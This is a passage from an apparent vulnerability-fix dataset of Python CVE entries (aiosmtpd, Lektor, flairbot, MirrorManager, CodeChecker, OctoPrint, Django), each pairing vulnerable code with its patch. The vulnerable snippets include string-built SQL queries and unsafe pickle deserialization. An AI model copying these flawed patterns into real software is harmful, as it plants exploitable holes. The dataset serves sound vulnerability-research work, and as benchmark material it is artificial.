5321 \\u00a7 4.2.5\n                if state == _DataState.NOMINAL:\n                    # Transition to TOO_LONG only if we haven't gone TOO_MUCH yet\n                    state = _DataState.TOO_LONG\n                # Discard data immediately to prevent memory pressure\n                data *= 0\n                # Drain the stream anyways\n                line = await self._reader.read(e.consumed)\n                assert not line.endswith(b'\\r\\n')\n            # A lone dot in a line signals the end of DATA.\n            if not line_fragments and line == b'.\\r\\n':\n                break\n            num_bytes += len(line)\n            if state == _DataState.NOMINAL and limit and num_bytes > limit:\n                # Delay SMTP Status Code sending until data receive is complete\n                # This seems to be implied in RFC 5321 \\u00a7 4.2.5\n                state = _DataState.TOO_MUCH\n                # Discard data immediately to prevent memory pressure\n                data *= 0\n            line_fragments.append(line)\n            if line.endswith(b'\\r\\n'):\n                # Record data only if state is \"NOMINAL\"\n                if state == _DataState.NOMINAL:\n                    line = EMPTY_BARR.join(line_fragments)\n                    if len(line) > self.line_length_limit:\n                        # Theoretically we shouldn't reach this place. But it's always\n                        # good to practice DEFENSIVE coding.\n                        state = _DataState.TOO_LONG\n                        # Discard data immediately to prevent memory pressure\n                        data *= 0\n                    else:\n                        data.append(EMPTY_BARR.join(line_fragments))\n                line_fragments *= 0\n\n        # Day of reckoning! Let's take care of those out-of-nominal situations\n        if state != _DataState.NOMINAL:\n            if state == _DataState.TOO_LONG:\n                await self.push(\"500 Line too long (see RFC5321 4.5.3.1.6)\")\n            elif state == _DataState.TOO_MUCH:  # pragma: nobranch\n                await self.push('552 Error: Too much mail data')\n            self._set_post_data_state()\n            return\n\n        # If unfinished_line is non-empty, then the connection was closed.\n        assert not line_fragments\n\n        # Remove extraneous carriage returns and de-transparency\n        # according to RFC 5321, Section 4.5.2.\n        for text in data:\n            if text.startswith(b'.'):\n                del text[0]\n        original_content: bytes = EMPTYBYTES.join(data)\n        # Discard data immediately to prevent memory pressure\n        data *= 0\n\n        content: Union[str, bytes]\n        if self._decode_data:\n            if self.enable_SMTPUTF8:\n                content = original_content.decode('utf-8', errors='surrogateescape')\n            else:\n                try:\n                    content = original_content.decode('ascii', errors='strict')\n                except UnicodeDecodeError:\n                    # This happens if enable_smtputf8 is false, meaning that\n                    # the server explicitly does not want to accept non-ascii,\n                    # but the client ignores that and sends non-ascii anyway.\n                    await self.push('500 Error: strict ASCII mode')\n                    return\n        else:\n            content = original_content\n        self.envelope.content = content\n        self.envelope.original_content = original_content\n\n        # Call the new API first if it's implemented.\n        if \"DATA\" in self._handle_hooks:\n            status = await self._call_handler_hook('DATA')\n        else:\n            # Backward compatibility.\n            status = MISSING\n            if hasattr(self.event_handler, 'process_message'):\n                warn('Use handler.handle_DATA() instead of .process_message()',\n                     DeprecationWarning)\n                assert self.session is not None\n                args = (self.session.peer, self.envelope.mail_from,\n                        self.envelope.rcpt_tos, self.envelope.content)\n                if asyncio.iscoroutinefunction(\n                        self.event_handler.process_message):\n                    status = await self.event_handler.process_message(*args)\n                else:\n                    status = self.event_handler.process_message(*args)\n                # The deprecated API can return None which means, return the\n                # default status.  Don't worry about coverage for this case as\n                # it's a deprecated API that will go away after 1.0.\n                if status is None:                  # pragma: nocover\n                    status = MISSING\n        self._set_post_data_state()\n        await self.push('250 OK' if status is MISSING else status)\n\n    # Commands that have not been implemented.\n    async def smtp_EXPN(self, arg: str):\n        await self.push('502 EXPN not implemented')"
      },
      {
        "id": "fix_py_419_2",
        "commit": "24b6c79c8921cf1800e27ca144f4f37023982bbb",
        "file_path": "aiosmtpd/smtp.py",
        "start_line": 90,
        "end_line": 90,
        "snippet": "NEWLINE = '\\r\\n'"
      }
    ],
    "vul_patch": "--- a/aiosmtpd/smtp.py\n+++ b/aiosmtpd/smtp.py\n@@ -22,9 +22,10 @@\n             # Since eof_received cancels this coroutine,\n             # readuntil() can never raise asyncio.IncompleteReadError.\n             try:\n-                line: bytes = await self._reader.readuntil()\n+                # https://datatracker.ietf.org/doc/html/rfc5321#section-2.3.8\n+                line: bytes = await self._reader.readuntil(b'\\r\\n')\n                 log.debug('DATA readline: %s', line)\n-                assert line.endswith(b'\\n')\n+                assert line.endswith(b'\\r\\n')\n             except asyncio.CancelledError:\n                 # The connection got reset during the DATA command.\n                 log.info('Connection lost during DATA')\n@@ -41,7 +42,7 @@\n                 data *= 0\n                 # Drain the stream anyways\n                 line = await self._reader.read(e.consumed)\n-                assert not line.endswith(b'\\n')\n+                assert not line.endswith(b'\\r\\n')\n             # A lone dot in a line signals the end of DATA.\n             if not line_fragments and line == b'.\\r\\n':\n                 break\n@@ -53,7 +54,7 @@\n                 # Discard data immediately to prevent memory pressure\n                 data *= 0\n             line_fragments.append(line)\n-            if line.endswith(b'\\n'):\n+            if line.endswith(b'\\r\\n'):\n                 # Record data only if state is \"NOMINAL\"\n                 if state == _DataState.NOMINAL:\n                     line = EMPTY_BARR.join(line_fragments)\n\n--- a/aiosmtpd/smtp.py\n+++ b/aiosmtpd/smtp.py\n@@ -1 +1 @@\n-NEWLINE = '\\n'\n+NEWLINE = '\\r\\n'\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-28335",
    "cve_description": "Lektor before 3.3.11 does not sanitize DB path traversal. Thus, shell commands might be executed via a file that is added to the templates directory, if the victim's web browser accesses an untrusted website that uses JavaScript to send requests to localhost port 5000, and the web browser is running on the same machine as the \"lektor server\" command.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/lektor/lektor",
    "patch_url": [
      "https://github.com/lektor/lektor/commit/7393d87bd354e43120937789956175064e4610a0"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_182_1",
        "commit": "4b57312",
        "file_path": "lektor/editor.py",
        "start_line": 36,
        "end_line": 103,
        "snippet": "def make_editor_session(pad, path, is_attachment=None, alt=PRIMARY_ALT, datamodel=None):\n    \"\"\"Creates an editor session for the given path object.\"\"\"\n    if alt != PRIMARY_ALT and not pad.db.config.is_valid_alternative(alt):\n        raise BadEdit(\"Attempted to edit an invalid alternative (%s)\" % alt)\n\n    raw_data = pad.db.load_raw_data(path, cls=OrderedDict, alt=alt, fallback=False)\n    raw_data_fallback = None\n    if alt != PRIMARY_ALT:\n        raw_data_fallback = pad.db.load_raw_data(path, cls=OrderedDict)\n        all_data = OrderedDict()\n        all_data.update(raw_data_fallback or ())\n        all_data.update(raw_data or ())\n    else:\n        all_data = raw_data\n\n    id = posixpath.basename(path)\n    if not is_valid_id(id):\n        raise BadEdit(\"Invalid ID\")\n\n    record = None\n    exists = raw_data is not None or raw_data_fallback is not None\n    if raw_data is None:\n        raw_data = OrderedDict()\n\n    if is_attachment is None:\n        if not exists:\n            is_attachment = False\n        else:\n            is_attachment = bool(all_data.get(\"_attachment_for\"))\n    elif bool(all_data.get(\"_attachment_for\")) != is_attachment:\n        raise BadEdit(\n            \"The attachment flag passed is conflicting with the \"\n            \"record's attachment flag.\"\n        )\n\n    if exists:\n        # XXX: what about changing the datamodel after the fact?\n        if datamodel is not None:\n            raise BadEdit(\n                \"When editing an existing record, a datamodel must not be provided.\"\n            )\n        datamodel = pad.db.get_datamodel_for_raw_data(all_data, pad)\n    else:\n        if datamodel is None:\n            datamodel = pad.db.get_implied_datamodel(path, is_attachment, pad)\n        elif isinstance(datamodel, str):\n            datamodel = pad.db.datamodels[datamodel]\n\n    if exists:\n        record = pad.instance_from_data(dict(all_data), datamodel)\n\n    for key in implied_keys:\n        raw_data.pop(key, None)\n        if raw_data_fallback:\n            raw_data_fallback.pop(key, None)\n\n    return EditorSession(\n        pad,\n        id,\n        str(path),\n        raw_data,\n        raw_data_fallback,\n        datamodel,\n        record,\n        exists,\n        is_attachment,\n        alt,\n    )"
      },
      {
        "id": "vul_py_182_2",
        "commit": "4b57312",
        "file_path": "lektor/utils.py",
        "start_line": 151,
        "end_line": 155,
        "snippet": "def untrusted_to_os_path(path):\n    path = path.strip(\"/\").replace(\"/\", os.path.sep)\n    if not isinstance(path, str):\n        path = path.decode(fs_enc, \"replace\")\n    return path"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_182_1",
        "commit": "7393d87",
        "file_path": "lektor/editor.py",
        "start_line": 45,
        "end_line": 116,
        "snippet": "def make_editor_session(pad, path, is_attachment=None, alt=PRIMARY_ALT, datamodel=None):\n    \"\"\"Creates an editor session for the given path object.\"\"\"\n    if not _is_valid_path(path):\n        raise BadEdit(\"Invalid path\")\n    path = cleanup_path(path)\n\n    if alt != PRIMARY_ALT and not pad.db.config.is_valid_alternative(alt):\n        raise BadEdit(\"Attempted to edit an invalid alternative (%s)\" % alt)\n\n    raw_data = pad.db.load_raw_data(path, cls=OrderedDict, alt=alt, fallback=False)\n    raw_data_fallback = None\n    if alt != PRIMARY_ALT:\n        raw_data_fallback = pad.db.load_raw_data(path, cls=OrderedDict)\n        all_data = OrderedDict()\n        all_data.update(raw_data_fallback or ())\n        all_data.update(raw_data or ())\n    else:\n        all_data = raw_data\n\n    id = posixpath.basename(path)\n    if not is_valid_id(id):\n        raise BadEdit(\"Invalid ID\")\n\n    record = None\n    exists = raw_data is not None or raw_data_fallback is not None\n    if raw_data is None:\n        raw_data = OrderedDict()\n\n    if is_attachment is None:\n        if not exists:\n            is_attachment = False\n        else:\n            is_attachment = bool(all_data.get(\"_attachment_for\"))\n    elif bool(all_data.get(\"_attachment_for\")) != is_attachment:\n        raise BadEdit(\n            \"The attachment flag passed is conflicting with the \"\n            \"record's attachment flag.\"\n        )\n\n    if exists:\n        # XXX: what about changing the datamodel after the fact?\n        if datamodel is not None:\n            raise BadEdit(\n                \"When editing an existing record, a datamodel must not be provided.\"\n            )\n        datamodel = pad.db.get_datamodel_for_raw_data(all_data, pad)\n    else:\n        if datamodel is None:\n            datamodel = pad.db.get_implied_datamodel(path, is_attachment, pad)\n        elif isinstance(datamodel, str):\n            datamodel = pad.db.datamodels[datamodel]\n\n    if exists:\n        record = pad.instance_from_data(dict(all_data), datamodel)\n\n    for key in implied_keys:\n        raw_data.pop(key, None)\n        if raw_data_fallback:\n            raw_data_fallback.pop(key, None)\n\n    return EditorSession(\n        pad,\n        id,\n        str(path),\n        raw_data,\n        raw_data_fallback,\n        datamodel,\n        record,\n        exists,\n        is_attachment,\n        alt,\n    )"
      },
      {
        "id": "fix_py_182_2",
        "commit": "7393d87",
        "file_path": "lektor/utils.py",
        "start_line": 151,
        "end_line": 156,
        "snippet": "def untrusted_to_os_path(path):\n    if not isinstance(path, str):\n        path = path.decode(fs_enc, \"replace\")\n    clean_path = cleanup_path(path)\n    assert clean_path.startswith(\"/\")\n    return clean_path[1:].replace(\"/\", os.path.sep)"
      },
      {
        "id": "fix_py_182_3",
        "commit": "7393d87",
        "file_path": "lektor/editor.py",
        "start_line": 38,
        "end_line": 42,
        "snippet": "def _is_valid_path(path: str) -> bool:\n    split_path = path.strip(\"/\").split(\"/\")\n    if split_path == [\"\"]:\n        split_path = []\n    return parse_path(path) == split_path"
      }
    ],
    "vul_patch": "--- a/lektor/editor.py\n+++ b/lektor/editor.py\n@@ -1,5 +1,9 @@\n def make_editor_session(pad, path, is_attachment=None, alt=PRIMARY_ALT, datamodel=None):\n     \"\"\"Creates an editor session for the given path object.\"\"\"\n+    if not _is_valid_path(path):\n+        raise BadEdit(\"Invalid path\")\n+    path = cleanup_path(path)\n+\n     if alt != PRIMARY_ALT and not pad.db.config.is_valid_alternative(alt):\n         raise BadEdit(\"Attempted to edit an invalid alternative (%s)\" % alt)\n \n\n--- a/lektor/utils.py\n+++ b/lektor/utils.py\n@@ -1,5 +1,6 @@\n def untrusted_to_os_path(path):\n-    path = path.strip(\"/\").replace(\"/\", os.path.sep)\n     if not isinstance(path, str):\n         path = path.decode(fs_enc, \"replace\")\n-    return path\n+    clean_path = cleanup_path(path)\n+    assert clean_path.startswith(\"/\")\n+    return clean_path[1:].replace(\"/\", os.path.sep)\n\n--- /dev/null\n+++ b/lektor/utils.py\n@@ -0,0 +1,5 @@\n+def _is_valid_path(path: str) -> bool:\n+    split_path = path.strip(\"/\").split(\"/\")\n+    if split_path == [\"\"]:\n+        split_path = []\n+    return parse_path(path) == split_path\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2015-10026",
    "cve_description": "A vulnerability was found in tiredtyrant flairbot. It has been declared as critical. This vulnerability affects unknown code of the file flair.py. The manipulation leads to sql injection. The patch is identified as 5e112b68c6faad1d4699d02c1ebbb7daf48ef8fb. It is recommended to apply a patch to fix this issue. VDB-217618 is the identifier assigned to this vulnerability.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/tiredtyrant/flairbot",
    "patch_url": [
      "https://github.com/tiredtyrant/flairbot/commit/5e112b68c6faad1d4699d02c1ebbb7daf48ef8fb"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_149_1",
        "commit": "47206a3",
        "file_path": "flair.py",
        "start_line": 9,
        "end_line": 27,
        "snippet": "def dbLookup(msg):\n    if len(msg.split(',')) != 2:\n        #procura na lista de paises\n        query = 'SELECT id FROM paises WHERE nome == \"%s\"' % (msg)\n        cursor.execute(query)\n        if cursor.fetchone():\n            return True\n        else:\n            return False\n    else:\n        cidade = msg.split(',')[0].strip()\n        estado = msg.split(',')[1].strip()\n        #check cidade pertence ao estado\n        query = 'SELECT estados.id FROM municipios JOIN estados ON municipios.estados_id == estados.id WHERE municipios.nome == \"%s\" AND estados.uf == \"%s\";' % (cidade, estado)\n        cursor.execute(query)\n        if not cursor.fetchone():\n            return False\n            \n    return True"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_149_1",
        "commit": "5e112b6",
        "file_path": "flair.py",
        "start_line": 9,
        "end_line": 27,
        "snippet": "def dbLookup(msg):\n    if len(msg.split(',')) != 2:\n        #procura na lista de paises\n        query = 'SELECT id FROM paises WHERE nome == ?;'\n        cursor.execute(query,(msg,))\n        if cursor.fetchone():\n            return True\n        else:\n            return False\n    else:\n        cidade = msg.split(',')[0].strip()\n        estado = msg.split(',')[1].strip()\n        #check cidade pertence ao estado\n        query = 'SELECT estados.id FROM municipios JOIN estados ON municipios.estados_id == estados.id WHERE municipios.nome == ? AND estados.uf == ?;'\n        cursor.execute(query,(cidade,estado))\n        if not cursor.fetchone():\n            return False\n            \n    return True"
      }
    ],
    "vul_patch": "--- a/flair.py\n+++ b/flair.py\n@@ -1,8 +1,8 @@\n def dbLookup(msg):\n     if len(msg.split(',')) != 2:\n         #procura na lista de paises\n-        query = 'SELECT id FROM paises WHERE nome == \"%s\"' % (msg)\n-        cursor.execute(query)\n+        query = 'SELECT id FROM paises WHERE nome == ?;'\n+        cursor.execute(query,(msg,))\n         if cursor.fetchone():\n             return True\n         else:\n@@ -11,8 +11,8 @@\n         cidade = msg.split(',')[0].strip()\n         estado = msg.split(',')[1].strip()\n         #check cidade pertence ao estado\n-        query = 'SELECT estados.id FROM municipios JOIN estados ON municipios.estados_id == estados.id WHERE municipios.nome == \"%s\" AND estados.uf == \"%s\";' % (cidade, estado)\n-        cursor.execute(query)\n+        query = 'SELECT estados.id FROM municipios JOIN estados ON municipios.estados_id == estados.id WHERE municipios.nome == ? AND estados.uf == ?;'\n+        cursor.execute(query,(cidade,estado))\n         if not cursor.fetchone():\n             return False\n             \n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2016-1000003",
    "cve_description": "Mirror Manager version 0.7.2 and older is vulnerable to remote code execution in the checkin code.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      }
    },
    "repo": "https://github.com/fedora-infra/mirrormanager2",
    "patch_url": [
      "https://github.com/fedora-infra/mirrormanager2/commit/2e227f6023477cbdbefd577f15d0846aa40c8775"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_113_1",
        "commit": "f21c59d",
        "file_path": "mirrormanager2/xmlrpc.py",
        "start_line": 43,
        "end_line": 49,
        "snippet": "def checkin(pickledata):\n    config = pickle.loads(bz2.decompress(base64.urlsafe_b64decode(pickledata)))\n    r, message = read_host_config(SESSION, config)\n    if r is not None:\n        return message + 'checked in successful'\n    else:\n        return message + 'error checking in'"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_113_1",
        "commit": "2e227f6",
        "file_path": "mirrormanager2/xmlrpc.py",
        "start_line": 44,
        "end_line": 54,
        "snippet": "def checkin(pickledata):\n    uncompressed = bz2.decompress(base64.urlsafe_b64decode(pickledata))\n    try:\n        config = json.loads(uncompressed)\n    except ValueError:\n        config = pickle.loads(uncompressed)\n    r, message = read_host_config(SESSION, config)\n    if r is not None:\n        return message + 'checked in successful'\n    else:\n        return message + 'error checking in'"
      }
    ],
    "vul_patch": "--- a/mirrormanager2/xmlrpc.py\n+++ b/mirrormanager2/xmlrpc.py\n@@ -1,5 +1,9 @@\n def checkin(pickledata):\n-    config = pickle.loads(bz2.decompress(base64.urlsafe_b64decode(pickledata)))\n+    uncompressed = bz2.decompress(base64.urlsafe_b64decode(pickledata))\n+    try:\n+        config = json.loads(uncompressed)\n+    except ValueError:\n+        config = pickle.loads(uncompressed)\n     r, message = read_host_config(SESSION, config)\n     if r is not None:\n         return message + 'checked in successful'\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-49793",
    "cve_description": "CodeChecker is an analyzer tooling, defect database and viewer extension for the Clang Static Analyzer and Clang Tidy. Zip files uploaded to the server endpoint of `CodeChecker store` are not properly sanitized. An attacker, using a path traversal attack, can load and display files on the machine of `CodeChecker server`. The vulnerable endpoint is `/Default/v6.53/CodeCheckerService@massStoreRun`. The path traversal vulnerability allows reading data on the machine of the `CodeChecker server`, with the same permission level as the `CodeChecker server`.\nThe attack requires a user account on the `CodeChecker server`, with permission to store to a server, and view the stored report. This vulnerability has been patched in version 6.23.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/Ericsson/codechecker",
    "patch_url": [
      "https://github.com/Ericsson/codechecker/commit/46bada41e32f3ba0f6011d5c556b579f6dddf07a"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_397_1",
        "commit": "1a90030e1d0b4f158ea2dce803ca366445414b6e",
        "file_path": "web/server/codechecker_server/api/mass_store_run.py",
        "start_line": 384,
        "end_line": 424,
        "snippet": "    def __store_source_files(\n        self,\n        source_root: str,\n        filename_to_hash: Dict[str, str]\n    ) -> Dict[str, int]:\n        \"\"\" Storing file contents from plist. \"\"\"\n\n        file_path_to_id = {}\n\n        for file_name, file_hash in filename_to_hash.items():\n            source_file_name = os.path.join(source_root, file_name.strip(\"/\"))\n            source_file_name = os.path.realpath(source_file_name)\n            LOG.debug(\"Storing source file: %s\", source_file_name)\n            trimmed_file_path = trim_path_prefixes(\n                file_name, self.__trim_path_prefixes)\n\n            if not os.path.isfile(source_file_name):\n                # The file was not in the ZIP file, because we already\n                # have the content. Let's check if we already have a file\n                # record in the database or we need to add one.\n\n                LOG.debug('%s not found or already stored.', trimmed_file_path)\n                with DBSession(self.__Session) as session:\n                    fid = add_file_record(\n                        session, trimmed_file_path, file_hash)\n\n                if not fid:\n                    LOG.error(\"File ID for %s is not found in the DB with \"\n                              \"content hash %s. Missing from ZIP?\",\n                              source_file_name, file_hash)\n                file_path_to_id[trimmed_file_path] = fid\n                LOG.debug(\"%d fileid found\", fid)\n                continue\n\n            with DBSession(self.__Session) as session:\n                self.__add_file_content(session, source_file_name, file_hash)\n\n                file_path_to_id[trimmed_file_path] = add_file_record(\n                    session, trimmed_file_path, file_hash)\n\n        return file_path_to_id"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_397_1",
        "commit": "46bada41e32f3ba0f6011d5c556b579f6dddf07a",
        "file_path": "web/server/codechecker_server/api/mass_store_run.py",
        "start_line": 384,
        "end_line": 424,
        "snippet": "    def __store_source_files(\n        self,\n        source_root: str,\n        filename_to_hash: Dict[str, str]\n    ) -> Dict[str, int]:\n        \"\"\" Storing file contents from plist. \"\"\"\n\n        file_path_to_id = {}\n\n        for file_name, file_hash in filename_to_hash.items():\n            source_file_path = path_for_fake_root(file_name, source_root)\n            LOG.debug(\"Storing source file: %s\", source_file_path)\n            trimmed_file_path = trim_path_prefixes(\n                file_name, self.__trim_path_prefixes)\n\n            if not os.path.isfile(source_file_path):\n                # The file was not in the ZIP file, because we already\n                # have the content. Let's check if we already have a file\n                # record in the database or we need to add one.\n\n                LOG.debug('%s not found or already stored.', trimmed_file_path)\n                with DBSession(self.__Session) as session:\n                    fid = add_file_record(\n                        session, trimmed_file_path, file_hash)\n\n                if fid:\n                    file_path_to_id[trimmed_file_path] = fid\n                    LOG.debug(\"%d fileid found\", fid)\n                else:\n                    LOG.error(\"File ID for %s is not found in the DB with \"\n                              \"content hash %s. Missing from ZIP?\",\n                              source_file_path, file_hash)\n                continue\n\n            with DBSession(self.__Session) as session:\n                self.__add_file_content(session, source_file_path, file_hash)\n\n                file_path_to_id[trimmed_file_path] = add_file_record(\n                    session, trimmed_file_path, file_hash)\n\n        return file_path_to_id"
      }
    ],
    "vul_patch": "--- a/web/server/codechecker_server/api/mass_store_run.py\n+++ b/web/server/codechecker_server/api/mass_store_run.py\n@@ -8,13 +8,12 @@\n         file_path_to_id = {}\n \n         for file_name, file_hash in filename_to_hash.items():\n-            source_file_name = os.path.join(source_root, file_name.strip(\"/\"))\n-            source_file_name = os.path.realpath(source_file_name)\n-            LOG.debug(\"Storing source file: %s\", source_file_name)\n+            source_file_path = path_for_fake_root(file_name, source_root)\n+            LOG.debug(\"Storing source file: %s\", source_file_path)\n             trimmed_file_path = trim_path_prefixes(\n                 file_name, self.__trim_path_prefixes)\n \n-            if not os.path.isfile(source_file_name):\n+            if not os.path.isfile(source_file_path):\n                 # The file was not in the ZIP file, because we already\n                 # have the content. Let's check if we already have a file\n                 # record in the database or we need to add one.\n@@ -24,16 +23,17 @@\n                     fid = add_file_record(\n                         session, trimmed_file_path, file_hash)\n \n-                if not fid:\n+                if fid:\n+                    file_path_to_id[trimmed_file_path] = fid\n+                    LOG.debug(\"%d fileid found\", fid)\n+                else:\n                     LOG.error(\"File ID for %s is not found in the DB with \"\n                               \"content hash %s. Missing from ZIP?\",\n-                              source_file_name, file_hash)\n-                file_path_to_id[trimmed_file_path] = fid\n-                LOG.debug(\"%d fileid found\", fid)\n+                              source_file_path, file_hash)\n                 continue\n \n             with DBSession(self.__Session) as session:\n-                self.__add_file_content(session, source_file_name, file_hash)\n+                self.__add_file_content(session, source_file_path, file_hash)\n \n                 file_path_to_id[trimmed_file_path] = add_file_record(\n                     session, trimmed_file_path, file_hash)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-3068",
    "cve_description": "Improper Privilege Management in GitHub repository octoprint/octoprint prior to 1.8.3.",
    "cwe_info": {
      "CWE-285": {
        "name": "Improper Authorization",
        "description": "The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-250": {
        "name": "Execution with Unnecessary Privileges",
        "description": "The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses."
      },
      "CWE-269": {
        "name": "Improper Privilege Management",
        "description": "The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor."
      }
    },
    "repo": "https://github.com/octoprint/octoprint",
    "patch_url": [
      "https://github.com/octoprint/octoprint/commit/ef95ef1c101b79394f134e8fce000e6bae046571"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_340_1",
        "commit": "2cbeb27140c5695fd91593baa682e9c930dc4f27",
        "file_path": "src/octoprint/plugins/pluginmanager/__init__.py",
        "start_line": 224,
        "end_line": 253,
        "snippet": "    def get_additional_permissions(self):\n        return [\n            {\n                \"key\": \"LIST\",\n                \"name\": \"List plugins\",\n                \"description\": gettext(\"Allows to list installed plugins.\"),\n                \"default_groups\": [READONLY_GROUP, USER_GROUP, ADMIN_GROUP],\n                \"roles\": [\"manage\"],\n            },\n            {\n                \"key\": \"MANAGE\",\n                \"name\": \"Manage plugins\",\n                \"description\": gettext(\n                    \"Allows to enable, disable and uninstall installed plugins.\"\n                ),\n                \"default_groups\": [ADMIN_GROUP],\n                \"roles\": [\"manage\"],\n            },\n            {\n                \"key\": \"INSTALL\",\n                \"name\": \"Install new plugins\",\n                \"description\": gettext(\n                    'Allows to install new plugins. Includes the \"Manage plugins\" permission.'\n                ),\n                \"default_groups\": [ADMIN_GROUP],\n                \"roles\": [\"install\"],\n                \"permissions\": [\"PLUGIN_PLUGINMANAGER_MANAGE\"],\n                \"dangerous\": True,\n            },\n        ]"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_340_1",
        "commit": "ef95ef1c101b79394f134e8fce000e6bae046571",
        "file_path": "src/octoprint/plugins/pluginmanager/__init__.py",
        "start_line": 224,
        "end_line": 253,
        "snippet": "    def get_additional_permissions(self):\n        return [\n            {\n                \"key\": \"LIST\",\n                \"name\": \"List plugins\",\n                \"description\": gettext(\"Allows to list installed plugins.\"),\n                \"default_groups\": [READONLY_GROUP, USER_GROUP, ADMIN_GROUP],\n                \"roles\": [\"list\"],\n            },\n            {\n                \"key\": \"MANAGE\",\n                \"name\": \"Manage plugins\",\n                \"description\": gettext(\n                    \"Allows to enable, disable and uninstall installed plugins.\"\n                ),\n                \"default_groups\": [ADMIN_GROUP],\n                \"roles\": [\"manage\"],\n            },\n            {\n                \"key\": \"INSTALL\",\n                \"name\": \"Install new plugins\",\n                \"description\": gettext(\n                    'Allows to install new plugins. Includes the \"Manage plugins\" permission.'\n                ),\n                \"default_groups\": [ADMIN_GROUP],\n                \"roles\": [\"install\"],\n                \"permissions\": [\"PLUGIN_PLUGINMANAGER_MANAGE\"],\n                \"dangerous\": True,\n            },\n        ]"
      }
    ],
    "vul_patch": "--- a/src/octoprint/plugins/pluginmanager/__init__.py\n+++ b/src/octoprint/plugins/pluginmanager/__init__.py\n@@ -5,7 +5,7 @@\n                 \"name\": \"List plugins\",\n                 \"description\": gettext(\"Allows to list installed plugins.\"),\n                 \"default_groups\": [READONLY_GROUP, USER_GROUP, ADMIN_GROUP],\n-                \"roles\": [\"manage\"],\n+                \"roles\": [\"list\"],\n             },\n             {\n                 \"key\": \"MANAGE\",\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-45452",
    "cve_description": "Storage.save in Django 2.2 before 2.2.26, 3.2 before 3.2.11, and 4.0 before 4.0.1 allows directory traversal if crafted filenames are directly passed to it.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/django/django",
    "patch_url": [
      "https://github.com/django/django/commit/e1592e0f26302e79856cc7f2218ae848ae19b0f6",
      "https://github.com/django/django/commit/4cb35b384ceef52123fc66411a73c36a706825e1",
      "https://github.com/django/django/commit/8d2f7cff76200cbd2337b2cf1707e383eb1fb54b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_11_1",
        "commit": "c9f648c",
        "file_path": "django/core/files/storage.py",
        "start_line": 40,
        "end_line": 54,
        "snippet": "    def save(self, name, content, max_length=None):\n        \"\"\"\n        Save new content to the file specified by name. The content should be\n        a proper File object or any Python file-like object, ready to be read\n        from the beginning.\n        \"\"\"\n        # Get the proper name for the file, as it will actually be saved.\n        if name is None:\n            name = content.name\n\n        if not hasattr(content, 'chunks'):\n            content = File(content, name)\n\n        name = self.get_available_name(name, max_length=max_length)\n        return self._save(name, content)"
      },
      {
        "id": "vul_py_11_2",
        "commit": "c9f648c",
        "file_path": "django/core/files/storage.py",
        "start_line": 65,
        "end_line": 97,
